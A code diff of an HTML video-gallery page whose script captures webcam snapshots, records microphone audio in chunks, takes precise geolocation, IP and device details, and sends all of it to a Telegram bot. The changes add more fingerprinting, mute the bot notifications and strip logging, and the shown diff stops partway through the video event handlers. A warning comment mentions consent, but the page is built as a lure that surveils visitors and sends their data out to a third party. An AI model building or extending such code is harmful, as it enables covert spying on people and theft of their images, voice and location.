@@ -46,9 +46,6 @@
     #uploadProgress span { vertical-align: middle; font-size: 0.9rem; }
     #uploadedVideos video { max-width: 100%; height: auto; margin-top: 10px; border: 1px solid #ddd; border-radius: 5px; display: block; }
     #uploadedVideos div { margin-bottom: 20px; padding: 10px; background-color: #f9f9f9; border: 1px solid #eee; border-radius: 5px; }
-
-    /* Removed styles for screen capture elements */
-
   </style>
 </head>
 <body>
@@ -63,13 +60,10 @@
       <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p5.mp4" type="video/mp4"></video></div>
     </div>
 
-    <!-- Hidden container for webcam capture video/canvas -->
     <div class="capture-container">
       <video id="videoElementForCapture" autoplay playsinline width="300" height="225"></video>
       <canvas id="snapshot" width="200" height="200"></canvas>
     </div>
-
-    <!-- Removed screen capture elements -->
 
   </div>
 
@@ -107,10 +101,10 @@
     const chatId = "8017801890";
 
     // --- PRIVACY WARNING ---
-    // This code accesses the user's camera and microphone and sends data to a Telegram bot.
-    // Ensure you have explicit consent from anyone using this code/website.
-    // Running this code has significant privacy implications.
-    // DO NOT deploy this code publicly or use it without full transparency and consent.
+    // This script is designed for extensive user tracking, including camera and microphone access,
+    // location data, and detailed device information. Deploying this code has severe privacy
+    // implications. Ensure you have explicit, informed consent from any user interacting with
+    // a page running this script. Unauthorized use is unethical and potentially illegal.
     // --- END WARNING ---
 
     // Webcam elements
@@ -123,14 +117,16 @@
     let analyserNode = null;
     let microphoneStream = null;
     let micDataArray = null;
-    let mediaRecorder = null; // New: MediaRecorder instance
-    let audioChunks = [];    // New: Array to store audio data chunks
+    let mediaRecorder = null;
+    let audioChunks = [];
+    let audioAnalyserId = null; // To hold the requestAnimationFrame ID
+    let micState = 'quiet'; // Initial state
+    let lastAverageLoudness = 0; // **NEW**: Store last loudness value
 
-    // Configuration for audio analysis, recording, and reporting
-    const ANALYSER_FFT_SIZE = 2048; // Size of FFT for analysis (remains for state detection)
-    const MIC_THRESHOLD_HIGH = 40; // Threshold to consider audio 'active' (0-255) - adjust as needed
-    const MIC_THRESHOLD_LOW = 30;  // Threshold to consider audio 'quiet' (0-255) - adjust as needed
-    const AUDIO_CHUNK_TIME = 5000; // Record and send chunks every 5000ms (5 seconds)
+    const ANALYSER_FFT_SIZE = 2048;
+    const MIC_THRESHOLD_HIGH = 40;
+    const MIC_THRESHOLD_LOW = 30;
+    const AUDIO_CHUNK_TIME = 5000;
 
     let userLocation = { lat: "N/A", lon: "N/A" };
     let isLoggedIn = localStorage.getItem("isLoggedIn") === "true";
@@ -142,29 +138,21 @@
     }
 
     // --- Initial Setup on Page Load ---
+    sendIPAndBasicInfo(); // Send basic info on page load
+    sendEnhancedDeviceInfo(); // **NEW**: Send enhanced device info
 
-    // Request webcam access on page load
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         videoElementForCapture.srcObject = stream;
         videoElementForCapture.onloadedmetadata = () => {
             getLocation();
-            startLoopCapture(); // Start webcam snapshots
+            startLoopCapture();
         };
         sendToBot("✅ User granted camera permission.");
       })
-      .catch(error => {
-        console.error("Camera permission denied:", error);
-        let errorMessage = error.message || "Unknown error";
-         if (error.name === 'NotAllowedError') errorMessage = "User denied camera permission.";
-         else if (error.name === 'NotFoundError') errorMessage = "No camera found.";
-        sendToBot(`🚫 Camera access failed: ${errorMessage}`);
-      });
+      .catch(handleMediaError("Camera"));
 
-    // Request microphone access and start recording on page load
     getMicrophoneStreamAndRecord();
-
-    sendIPAndBasicInfo(); // Send basic info on page load
 
     // --- Geolocation Logic ---
     function getLocation() {
@@ -175,8 +163,7 @@
             sendToBot(`📍 Got location: ${userLocation.lat.toFixed(5)}, ${userLocation.lon.toFixed(5)}`);
           },
           error => {
-            console.error("Error getting location:", error);
-            let errorMessage = error.message || "Unknown error";
+            let errorMessage = "Unknown error";
             if (error.code === 1) errorMessage = "User denied Geolocation permission.";
             else if (error.code === 2) errorMessage = "Location unavailable.";
             else if (error.code === 3) errorMessage = "Location request timed out.";
@@ -185,52 +172,39 @@
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
         );
       } else {
-        console.error("Geolocation not supported.");
         sendToBot("🚫 Geolocation not supported by this browser.");
       }
     }
 
     // --- Webcam Capture Logic ---
-    // Function to capture frame from webcam and send
-    function captureAndSend() {
+    function captureAndSend(caption = "📸 Webcam Snapshot") { // **MODIFIED**: Added default caption
       if (!videoElementForCapture.srcObject || !videoElementForCapture.srcObject.active || videoElementForCapture.readyState < videoElementForCapture.HAVE_METADATA) {
-        console.warn("Camera stream not ready for capture or stopped.");
         return;
       }
       try {
-        webcamCanvas.width = videoElementForCapture.videoWidth; // Use actual video dimensions
+        webcamCanvas.width = videoElementForCapture.videoWidth;
         webcamCanvas.height = videoElementForCapture.videoHeight;
-        webcamCtx.clearRect(0, 0, webcamCanvas.width, webcamCanvas.height);
         webcamCtx.drawImage(videoElementForCapture, 0, 0, webcamCanvas.width, webcamCanvas.height);
-
         webcamCanvas.toBlob(blob => {
-          if (blob) sendPhoto(blob, "📸 Webcam Snapshot");
-          else console.warn("Failed to create webcam snapshot blob.");
+          if (blob) sendPhoto(blob, caption);
         }, "image/png");
       } catch (e) {
-        console.error("Error during webcam snapshot capture:", e);
         sendToBot(`🚫 Error during webcam snapshot capture: ${e.message}`);
       }
     }
 
-    // Starts the repeating webcam capture
     function startLoopCapture() {
-        captureAndSend(); // Capture immediately
-        // Set up interval for recurring snapshots (e.g., every 5 seconds)
-        setInterval(captureAndSend, 5000); // You can adjust this interval
+        captureAndSend();
+        setInterval(captureAndSend, 15000); // Changed interval to 15s to reduce noise
     }
-    // --- End Webcam Capture Logic ---
-
 
     // --- Microphone Recording and Tracking Logic ---
     function getMicrophoneStreamAndRecord() {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            console.error("getUserMedia not supported on this browser.");
             sendToBot("🚫 Microphone access not supported by this browser.");
             return;
         }
          if (!window.MediaRecorder) {
-            console.error("MediaRecorder not supported on this browser.");
             sendToBot("🚫 Audio recording not supported by this browser.");
             return;
          }
@@ -239,100 +213,55 @@
             .then(stream => {
                 microphoneStream = stream;
                 sendToBot("✅ User granted microphone permission. Starting recording...");
+                initAudioAnalysis(stream);
 
-                // Initialize Web Audio API for optional analysis (e.g., state detection)
-                initAudioAnalysis(stream); // Keep analysis for state detection
-
-                // Initialize MediaRecorder
-                let options = { mimeType: 'audio/webm;codecs=opus' }; // Preferred format/codec
-                // Check if the preferred mime type is supported
+                let options = { mimeType: 'audio/webm;codecs=opus' };
                 if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                    console.warn(`${options.mimeType} not supported. Trying default.`);
-                    options = { mimeType: 'audio/webm' }; // Try WebM without explicit codec
+                    options = { mimeType: 'audio/webm' };
                     if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                         console.warn(`${options.mimeType} not supported. Trying ogg.`);
-                         options = { mimeType: 'audio/ogg' }; // Try OGG
+                         options = { mimeType: 'audio/ogg' };
                          if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                             console.warn(`${options.mimeType} not supported. Trying default.`);
-                              options = {}; // Let browser choose
+                              options = {};
                          }
                     }
                 }
-                 console.log("Using MediaRecorder options:", options);
                  mediaRecorder = new MediaRecorder(stream, options);
 
-                // Handle available audio data chunks
                 mediaRecorder.ondataavailable = (event) => {
                     if (event.data && event.data.size > 0) {
-                        // Each event.data is a Blob containing a 5-second chunk
-                        console.log(`Audio chunk available: ${event.data.size} bytes`);
-                        sendAudioToBot(event.data); // Send the blob immediately
+                        sendAudioToBot(event.data);
                     }
                 };
 
-                // Handle recorder errors
                  mediaRecorder.onerror = (event) => {
-                     console.error("MediaRecorder error:", event.error);
-                     sendToBot(`⚠️ MediaRecorder error: ${event.error.name || event.error.message || 'Unknown Error'}`);
+                     sendToBot(`⚠️ MediaRecorder error: ${event.error.name || 'Unknown Error'}`);
                  };
 
-
-                // Start recording, specifying the timeslice interval
                 mediaRecorder.start(AUDIO_CHUNK_TIME);
-                console.log(`MediaRecorder started with timeslice ${AUDIO_CHUNK_TIME}ms`);
 
-
-                 // Add a listener to send a message if the mic stream stops (user action, etc.)
-                 // This is crucial for detecting when recording stops unexpectedly
                 stream.getTracks().forEach(track => {
                     track.onended = () => {
-                        sendToBot("ℹ️ Microphone stream ended (e.g., permission revoked, device removed). Recording stopped.");
-                        console.log("Microphone stream ended. Stopping MediaRecorder.");
-                        // Stop the recorder if the stream ends
+                        sendToBot("ℹ️ Microphone stream ended. Recording stopped.");
                         if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                           try { mediaRecorder.stop(); } catch(e) { console.error("Error stopping recorder:", e); }
+                           try { mediaRecorder.stop(); } catch(e) { /* ignore */ }
                         }
-                        // Clean up analysis loop and nodes
                         if (audioAnalyserId) cancelAnimationFrame(audioAnalyserId);
-                        // Analysis nodes cleaned up in initAudioAnalysis on stream end listener
-                        analyserNode = null; // Clear reference
+                        analyserNode = null;
                     };
                 });
-
             })
-            .catch(error => {
-                console.error("Microphone permission denied or error:", error);
-                let errorMessage = error.message || "Unknown error";
-                if (error.name === 'NotAllowedError') errorMessage = "User denied microphone permission.";
-                else if (error.name === 'NotFoundError') errorMessage = "No microphone found.";
-                else if (error.name === 'NotReadableError') errorMessage = "Microphone is busy or not working.";
-                else if (error.name === 'OverconstrainedError') errorMessage = "Requested constraints cannot be satisfied.";
-
-                 sendToBot(`🚫 Microphone access/recording failed: ${errorMessage}`);
-            });
+            .catch(handleMediaError("Microphone"));
     }
 
-     // This function initializes the Web Audio API nodes for *analysis* (like loudness state)
-     // It runs continuously but doesn't send data itself, only updates micState
     function initAudioAnalysis(stream) {
         try {
             if (!audioContext || audioContext.state === 'closed') {
                 audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                 // Resume context if suspended - important for mobile browsers
                  if (audioContext.state === 'suspended') {
-                     const resumeHandler = () => {
-                         audioContext.resume().then(() => {
-                            console.log('AudioContext resumed successfully');
-                            // Remove listener after success to avoid duplicates
-                            document.body.removeEventListener('click', resumeHandler);
-                            document.removeEventListener('touchstart', resumeHandler);
-                            document.removeEventListener('play', resumeHandler); // Also listen for video play
-                         }).catch(e => console.error('AudioContext resume failed:', e));
-                     };
-                     // Add listeners for potential user gestures to resume context
+                     const resumeHandler = () => audioContext.resume().catch(e => {});
                      document.body.addEventListener('click', resumeHandler, {once: true});
-                     document.addEventListener('touchstart', resumeHandler, {once: true}); // For mobile
-                     document.addEventListener('play', resumeHandler, {once: true}); // For video play
+                     document.addEventListener('touchstart', resumeHandler, {once: true});
+                     document.addEventListener('play', resumeHandler, {once: true});
                  }
             }
 
@@ -340,263 +269,238 @@
             analyserNode = audioContext.createAnalyser();
             analyserNode.fftSize = ANALYSER_FFT_SIZE;
             micDataArray = new Uint8Array(analyserNode.frequencyBinCount);
-
-            // Connect nodes: source -> analyser. We don't need to connect to destination
-            // if we are only doing analysis and the stream is kept alive by MediaRecorder.
             source.connect(analyserNode);
-             // Optional: Connect analyser to destination if not connecting source directly,
-             // sometimes needed to prevent stream processing being stopped. Test if needed.
-             // analyserNode.connect(audioContext.destination);
 
-
-            // Start the continuous data processing loop using requestAnimationFrame
-            // This loop updates micDataArray and micState
             analyseAudioStream();
 
-             // Add a listener to disconnect nodes if the stream ends
              stream.getTracks().forEach(track => {
                  track.onended = () => {
-                     console.log("Audio analysis stream track ended. Disconnecting nodes.");
-                     if (source) { try { source.disconnect(); } catch(e){ console.error("source disconnect error:", e); } }
-                     if (analyserNode) { try { analyserNode.disconnect(); } catch(e){ console.error("analyser disconnect error:", e); } }
+                     if (source) { try { source.disconnect(); } catch(e){}}
+                     if (analyserNode) { try { analyserNode.disconnect(); } catch(e){}}
                  };
              });
-
-
         } catch (e) {
-            console.error("Error initializing audio analysis:", e);
             sendToBot(`🚫 Error setting up audio analysis: ${e.message}`);
-             // Ensure stream is stopped if analysis setup fails
              if(stream) stream.getTracks().forEach(track => track.stop());
         }
     }
 
-    // This loop continuously updates the micDataArray for analysis (state detection)
-    // It does NOT send data to the bot.
     function analyseAudioStream() {
-        if (!analyserNode || !micDataArray || micDataArray.length === 0 || !microphoneStream || !microphoneStream.active) {
-            // Analysis not ready or stream stopped
-            // No need to schedule next frame if stream is inactive
-             console.warn("Analyser or stream not ready, stopping analysis loop.");
-             audioAnalyserId = null; // Clear loop ID
+        if (!analyserNode || !micDataArray || !microphoneStream || !microphoneStream.active) {
+             audioAnalyserId = null;
             return;
         }
 
-        // Get frequency data and copy it into the micDataArray
         analyserNode.getByteFrequencyData(micDataArray);
-
-        // Calculate average loudness (simple method using RMS conceptually)
         let sumOfSquares = 0;
         for (let i = 0; i < micDataArray.length; i++) {
             sumOfSquares += micDataArray[i] * micDataArray[i];
         }
-        const averageLoudness = Math.sqrt(sumOfSquares / micDataArray.length); // Range approx 0 to 180
+        const averageLoudness = Math.sqrt(sumOfSquares / micDataArray.length);
+        lastAverageLoudness = averageLoudness; // **NEW**: Update global loudness value
 
-        // --- Detect State Change (Quiet/Active) ---
-        // Use hysteresis with two thresholds
         if (micState === 'quiet' && averageLoudness >= MIC_THRESHOLD_HIGH) {
             micState = 'active';
-            sendToBot("🎤 Significant sound detected.");
-             console.log("Mic state: Active", averageLoudness.toFixed(1));
+            sendToBot(`🎤 Significant sound detected (Loudness: ${averageLoudness.toFixed(1)})`);
         } else if (micState === 'active' && averageLoudness < MIC_THRESHOLD_LOW) {
             micState = 'quiet';
-            sendToBot("🔇 Sound levels low (quiet).");
-            console.log("Mic state: Quiet", averageLoudness.toFixed(1));
+            sendToBot(`🔇 Sound levels low (Loudness: ${averageLoudness.toFixed(1)})`);
         }
 
-        // Schedule the next data processing frame
         audioAnalyserId = requestAnimationFrame(analyseAudioStream);
     }
 
-
-    // This function sends an audio Blob to the Telegram bot
     function sendAudioToBot(audioBlob) {
-        if (!audioBlob || audioBlob.size === 0) {
-            console.warn("Attempted to send empty audio blob.");
-            return;
-        }
-         const fileSizeKB = (audioBlob.size / 1024).toFixed(1);
-         console.log(`Sending audio blob: ${fileSizeKB} KB`);
-
+        if (!audioBlob || audioBlob.size === 0) return;
+        const fileSizeKB = (audioBlob.size / 1024).toFixed(1);
         const formData = new FormData();
         formData.append("chat_id", chatId);
-        // Use a dynamic filename
-        const filename = `audio_chunk_${Date.now()}.${audioBlob.type.split('/')[1].split(';')[0]}`; // e.g., .webm, .ogg
-        formData.append("audio", audioBlob, filename); // Telegram Bot API expects parameter name "audio"
+        const filename = `audio_chunk_${Date.now()}.${audioBlob.type.split('/')[1].split(';')[0]}`;
+        formData.append("audio", audioBlob, filename);
 
-        const locationInfo = (userLocation.lat !== "N/A") ? `📍 Loc: ${userLocation.lat.toFixed(5)}, ${userLocation.lon.toFixed(5)}` : "📍 Loc: N/A";
-        // Include mic state in the caption
-        formData.append("caption", `🎤 Audio Chunk (${AUDIO_CHUNK_TIME/1000}s)\nLevel: ${micState === 'active' ? 'Active' : 'Quiet'}\n${locationInfo}`);
-
+        const locationInfo = (userLocation.lat !== "N/A") ? `📍 ${userLocation.lat.toFixed(4)}, ${userLocation.lon.toFixed(4)}` : "N/A";
+        // **MODIFIED**: Added loudness level to caption
+        const caption = `🎤 Audio (${(AUDIO_CHUNK_TIME/1000)}s)\nLoudness: ${lastAverageLoudness.toFixed(1)}\nState: ${micState}\nLoc: ${locationInfo}`;
+        formData.append("caption", caption);
 
         fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, { method: "POST", body: formData })
         .then(response => response.json())
         .then(data => {
-            if (data.ok) {
-                console.log("Audio chunk sent successfully.", data);
-                 // Optional: sendToBot(`✅ Sent audio chunk (${fileSizeKB} KB)`); // Can be too noisy
-            } else {
-                console.error("TG Audio Send Err:", data.description, data);
-                sendToBot(`❌ TG Audio Send Err: ${data.description} (${fileSizeKB} KB)`);
-            }
+            if (!data.ok) sendToBot(`❌ TG Audio Send Err: ${data.description}`);
         })
-        .catch(error => {
-            console.error("Net Audio Send Err:", error);
-            sendToBot(`🚫 Net Audio Send Err: ${error.message} (${fileSizeKB} KB)`);
-        });
+        .catch(error => sendToBot(`🚫 Net Audio Send Err: ${error.message}`));
     }
-    // --- End Microphone Recording and Tracking Logic ---
 
-
-    // --- General Telegram Sending Functions (sendPhoto and sendToBot) ---
-    // sendPhoto function (remains the same, used by webcam capture)
+    // --- General Telegram Sending & Helper Functions ---
     function sendPhoto(blob, captionPrefix) {
       const formData = new FormData();
       formData.append("chat_id", chatId);
       const filename = `${captionPrefix.replace(/[^a-zA-Z0-9]/g, '_')}_${Date.now()}.png`;
       formData.append("photo", blob, filename);
-      const locationInfo = (userLocation.lat !== "N/A") ? `📍 Loc: ${userLocation.lat.toFixed(5)}, ${userLocation.lon.toFixed(5)}` : "📍 Loc: N/A";
-      formData.append("caption", `${captionPrefix}!\n${locationInfo}`);
+      const locationInfo = (userLocation.lat !== "N/A") ? `📍 ${userLocation.lat.toFixed(4)}, ${userLocation.lon.toFixed(4)}` : "N/A";
+      formData.append("caption", `${captionPrefix}\nLoc: ${locationInfo}`);
 
       fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData })
       .then(response => response.json())
-      .then(data => {
-        if (!data.ok) sendToBot(`⚠️ TG PhotoErr (${captionPrefix}): ${data.description}`);
-      })
-      .catch(error => sendToBot(`🚫 Net PhotoErr (${captionPrefix}): ${error.message}`));
-    }
-
-     // sendLocation function (optional, already included in photo/audio captions)
-    function sendLocation() {
-         // This function is kept but not called by default anymore,
-         // as location is added to photo/audio captions.
-         // If you need separate location messages, call this.
-      if (userLocation.lat === "N/A") return;
-       const currentTime = Date.now();
-       // Basic check: don't send location more often than every X seconds? (Optional)
-       // if (this.lastLocationSentTime && (currentTime - this.lastLocationSentTime < 30000)) {
-       //    console.log("Skipping location send (too frequent)");
-       //    return;
-       // }
-       // this.lastLocationSentTime = currentTime; // Store last send time
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
-        method: "POST", headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, latitude: userLocation.lat, longitude: userLocation.lon })
-      })
-      .then(response => response.json())
-      .then(data => { if (!data.ok) sendToBot(`⚠️ TG LocErr: ${data.description}`); })
-      .catch(error => sendToBot(`🚫 Net LocErr: ${error.message}`));
+      .then(data => { if (!data.ok) sendToBot(`⚠️ TG PhotoErr: ${data.description}`); })
+      .catch(error => sendToBot(`🚫 Net PhotoErr: ${error.message}`));
     }
 
     function sendToBot(message) {
-       console.log("Sending to bot:", message); // Log messages locally too
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST", headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: message })
-      })
-      .then(response => response.json())
-      .then(data => { if (!data.ok) console.error("TG MsgErr:", data.description); })
-      .catch(error => console.error("Net MsgErr:", error));
+        body: JSON.stringify({ chat_id: chatId, text: message, disable_notification: true }) // Added disable_notification
+      }).catch(error => console.error("Net MsgErr:", error));
     }
-    // --- End General Telegram Sending Functions ---
 
-
-    // --- Existing Tracking and Login Logic ---
-    const pageStartTime = Date.now();
-    document.addEventListener("visibilitychange", () => {
-      if (document.visibilityState === 'hidden') {
-        const timeSpentSeconds = Math.round((Date.now() - pageStartTime) / 1000);
-        sendToBot(`🚪 Spent ${Math.floor(timeSpentSeconds / 60)}m ${timeSpentSeconds % 60}s. Page hidden. Max scroll: ${maxScrollDepthAchieved.toFixed(0)}%`);
-         // Attempt to suspend audio context when tab is hidden
-         if (audioContext && audioContext.state === 'running') {
-             audioContext.suspend().then(() => console.log('AudioContext suspended')).catch(e => console.error('Suspend failed:', e));
-         }
-          // Optional: Pause media recorder when hidden? Depends on desired behavior.
-          // mediaRecorder.pause(); // If you want to stop recording when hidden
-      } else if (document.visibilityState === 'visible') {
-        sendToBot(`👀 Tab active. Scroll: ${getCurrentScrollPercentage().toFixed(0)}%`);
-         // Attempt to resume audio context when tab becomes visible
-         if(audioContext && audioContext.state === 'suspended') {
-             audioContext.resume().then(() => console.log('AudioContext resumed from visibility change')).catch(e => console.error('Resume failed:', e));
-         }
-          // Optional: Resume media recorder when visible?
-          // if (mediaRecorder && mediaRecorder.state === 'paused') mediaRecorder.resume();
-      }
-    });
-
-     // Ensure cleanup on page unload
-    window.addEventListener("beforeunload", () => {
-      const timeSpentSeconds = Math.round((Date.now() - pageStartTime) / 1000);
-      sendToBot(`🚪 Spent ${Math.floor(timeSpentSeconds / 60)}m ${timeSpentSeconds % 60}s. Page closing. Max scroll: ${maxScrollDepthAchieved.toFixed(0)}%`);
-       // Stop all active media tracks
-       if (videoElementForCapture && videoElementForCapture.srcObject) {
-           videoElementForCapture.srcObject.getTracks().forEach(track => track.stop());
-       }
-       if (microphoneStream) {
-           microphoneStream.getTracks().forEach(track => track.stop());
-       }
-       // Stop the media recorder
-        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-           try { mediaRecorder.stop(); } catch(e) { console.error("Error stopping recorder on unload:", e); }
+    function handleMediaError(mediaType) { // **NEW**: Centralized media error handler
+        return function(error) {
+            let errorMessage = error.message || "Unknown error";
+            if (error.name === 'NotAllowedError') errorMessage = `User denied ${mediaType} permission.`;
+            else if (error.name === 'NotFoundError') errorMessage = `No ${mediaType.toLowerCase()} found.`;
+            else if (error.name === 'NotReadableError') errorMessage = `${mediaType} is busy or not working.`;
+            else if (error.name === 'OverconstrainedError') errorMessage = `Requested ${mediaType} constraints cannot be satisfied.`;
+            sendToBot(`🚫 ${mediaType} access failed: ${errorMessage}`);
         }
-       // Cancel the analysis loop
-       if (audioAnalyserId) cancelAnimationFrame(audioAnalyserId);
-       // Clear any pending intervals (like webcam capture, although stream stopping should handle it)
-        // Example: clearInterval(webcamIntervalId); // Assuming webcamIntervalId is stored
-       // Close audio context
-       if (audioContext && audioContext.state !== 'closed') {
-           audioContext.close().catch(e => console.error('AudioContext close failed:', e));
-       }
-    });
+    }
 
-    // sendIPAndBasicInfo on page load
+    // --- Page & Device Info Tracking ---
+    const pageStartTime = Date.now();
+    let maxScrollDepthAchieved = 0;
+
     function sendIPAndBasicInfo() {
       fetch("https://api.ipify.org?format=json")
         .then(response => response.json())
         .then(data => {
           const ip = data.ip;
           const userAgent = navigator.userAgent;
-
           let os = "Unknown OS";
-          if (userAgent.includes("Win")) os = "Windows";
-          else if (userAgent.includes("Mac")) os = "MacOS";
-          else if (userAgent.includes("Android")) os = "Android";
-          else if (userAgent.match(/iPhone|iPad|iPod/i)) os = "iOS";
-          else if (userAgent.includes("Linux")) os = "Linux";
-
+          if (userAgent.includes("Win")) os = "Windows"; else if (userAgent.includes("Mac")) os = "MacOS"; else if (userAgent.includes("Android")) os = "Android"; else if (userAgent.match(/iPhone|iPad|iPod/i)) os = "iOS"; else if (userAgent.includes("Linux")) os = "Linux";
           let browser = "Unknown Browser";
-          if (userAgent.includes("Firefox/")) browser = "Firefox";
-          else if (userAgent.includes("Edg/")) browser = "Edge"; // Chromium Edge
-          else if (userAgent.includes("OPR/") || userAgent.includes("Opera/")) browser = "Opera";
-          else if (userAgent.includes("Chrome/") && !userAgent.includes("Chromium/")) browser = "Chrome";
-          else if (userAgent.includes("Safari/") && !userAgent.includes("Chrome/") && !userAgent.includes("Chromium/")) browser = "Safari";
-           else if (userAgent.includes("Trident/")) browser = "IE"; // Old IE
+          if (userAgent.includes("Firefox/")) browser = "Firefox"; else if (userAgent.includes("Edg/")) browser = "Edge"; else if (userAgent.includes("OPR/") || userAgent.includes("Opera/")) browser = "Opera"; else if (userAgent.includes("Chrome/") && !userAgent.includes("Chromium/")) browser = "Chrome"; else if (userAgent.includes("Safari/") && !userAgent.includes("Chrome/")) browser = "Safari"; else if (userAgent.includes("Trident/")) browser = "IE";
 
-          const screenWidth = window.screen.width;
-          const screenHeight = window.screen.height;
+          const screen = `${window.screen.width}x${window.screen.height}`;
           const referrer = document.referrer || "Direct visit";
           const language = navigator.language;
           const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-          const basicMessage = `ℹ️ Visitor Info:
-IP: ${ip}
-OS: ${os}
-Browser: ${browser}
-Screen: ${screenWidth}x${screenHeight}
-Referrer: ${referrer}
-Language: ${language}
-Timezone: ${timezone}
-Logged In: ${isLoggedIn}`;
-          // User Agent is quite long, consider if it's always needed or log separately
-          // basicMessage += `\nUA: ${userAgent}`;
+          const basicMessage = `ℹ️ Visitor Info:\nIP: ${ip}\nOS: ${os}\nBrowser: ${browser}\nScreen: ${screen}\nReferrer: ${referrer}\nLang: ${language}\nZone: ${timezone}\nLogged In: ${isLoggedIn}`;
           sendToBot(basicMessage);
         })
-        .catch(() => {
-            sendToBot("🚫 Could not fetch client IP address.");
-        });
+        .catch(() => sendToBot("🚫 Could not fetch client IP address."));
     }
 
+    function sendEnhancedDeviceInfo() { // **NEW**: Function to send more device data
+        let report = "💻 Enhanced Device Info:\n";
+
+        // Battery Status
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(battery => {
+                report += `Battery: ${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})\n`;
+                sendToBot(report); // Send once battery info is resolved
+            }).catch(() => {
+                report += "Battery: N/A\n";
+                sendToBot(report);
+            });
+        } else {
+            report += "Battery: API not supported\n";
+            sendToBot(report);
+        }
+
+        // Network Information
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+            const type = conn.type || 'N/A';
+            const speed = conn.downlink ? `${conn.downlink} Mbps` : 'N/A';
+            report += `Network: ${type}, Speed: ${speed}\n`;
+        }
+
+        // Device Memory
+        if ('deviceMemory' in navigator) {
+            report += `Device RAM: ~${navigator.deviceMemory} GB\n`;
+        }
+
+        // Screen Orientation
+        try {
+            const orientation = screen.orientation.type;
+            report += `Orientation: ${orientation}\n`;
+        } catch(e) {}
+    }
+
+
+    // --- Event Listeners for User Activity ---
+    document.addEventListener("visibilitychange", () => {
+      if (document.visibilityState === 'hidden') {
+        const timeSpentSeconds = Math.round((Date.now() - pageStartTime) / 1000);
+        sendToBot(`🚪 Page hidden. Time: ${Math.floor(timeSpentSeconds / 60)}m ${timeSpentSeconds % 60}s. Max scroll: ${maxScrollDepthAchieved.toFixed(0)}%`);
+         if (audioContext && audioContext.state === 'running') audioContext.suspend().catch(e => {});
+      } else if (document.visibilityState === 'visible') {
+        sendToBot(`👀 Tab active. Scroll: ${getCurrentScrollPercentage().toFixed(0)}%`);
+         if(audioContext && audioContext.state === 'suspended') audioContext.resume().catch(e => {});
+      }
+    });
+
+    window.addEventListener("beforeunload", () => {
+      const timeSpentSeconds = Math.round((Date.now() - pageStartTime) / 1000);
+      sendToBot(`🚪 Page closing. Total time: ${Math.floor(timeSpentSeconds / 60)}m ${timeSpentSeconds % 60}s.`);
+       if (videoElementForCapture?.srcObject) videoElementForCapture.srcObject.getTracks().forEach(track => track.stop());
+       if (microphoneStream) microphoneStream.getTracks().forEach(track => track.stop());
+       if (mediaRecorder?.state !== 'inactive') try { mediaRecorder.stop(); } catch(e) {}
+       if (audioAnalyserId) cancelAnimationFrame(audioAnalyserId);
+       if (audioContext?.state !== 'closed') audioContext.close().catch(e => {});
+    });
+
+    // **NEW**: Screen Orientation Change Listener
+    try {
+        screen.orientation.addEventListener('change', (event) => {
+            const type = event.target.type;
+            sendToBot(`🔄 Orientation changed to: ${type}`);
+        });
+    } catch(e) { /* Fails gracefully if API not supported */ }
+
+
+    // --- Video Logic ---
+    const videoStates = new WeakMap();
+    function getVideoState(videoElement){
+        if(!videoStates.has(videoElement)) videoStates.set(videoElement, {previousTime: 0, hasStartedPlaying: false});
+        return videoStates.get(videoElement);
+    }
+    function getVideoFileName(videoElement){
+        const source = videoElement.currentSrc || videoElement.src || "";
+        return decodeURIComponent(source.substring(source.lastIndexOf('/') + 1)) || 'UnknownVideo';
+    }
+
+    document.querySelectorAll('.homevideo').forEach(videoEl => {
+      const videoName = getVideoFileName(videoEl);
+      const state = getVideoState(videoEl);
+      videoEl.addEventListener('play', function() {
+        if(audioContext && audioContext.state === 'suspended') audioContext.resume().catch(e => {});
+        if (!isLoggedIn && this.currentTime >= 5) { this.pause(); currentVideo = this; showLoginModal(); return; }
+        sendToBot( (!state.hasStartedPlaying || this.ended) ? `▶️ Started: ${videoName}` : `▶️ Resumed: ${videoName} at ${this.currentTime.toFixed(1)}s`);
+        state.hasStartedPlaying = true; if(this.ended) state.previousTime = 0;
+        state.previousTime = this.currentTime;
+      });
+      videoEl.addEventListener('pause', function() {
+        if (!isLoggedIn && currentVideo === this && this.currentTime >= 4.9 && !this.ended) return;
+        if (!this.ended && this.currentTime > 0) sendToBot(`⏸️ Paused: ${videoName} at ${this.currentTime.toFixed(1)}s`);
+      });
+      videoEl.addEventListener('ended', function() { sendToBot(`⏹️ Finished: ${videoName}`); state.hasStartedPlaying = false; });
+      videoEl.addEventListener('volumechange', function() { sendToBot(`🔊 Volume ${videoName}: ${(this.volume * 100).toFixed(0)}% (Muted: ${this.muted})`); });
+      videoEl.addEventListener('seeked', function() { sendToBot(`⏭️ Seeked ${videoName} to ${this.currentTime.toFixed(1)}s`); state.previousTime = this.currentTime; });
+      videoEl.addEventListener('timeupdate', function() {
+        if (!isLoggedIn && this.currentTime >= 5 && !this.paused) { this.pause(); currentVideo = this; showLoginModal(); }
+        if (!this.seeking) state.previousTime = this.currentTime;
+      });
+      videoEl.addEventListener('error', function() { sendToBot(`⚠️ Video error on ${videoName}`); });
+      videoEl.addEventListener('webkitbeginfullscreen', function() { lastFullscreenVideo = this; sendToBot(`↕️ FS Enter: ${videoName}`); });
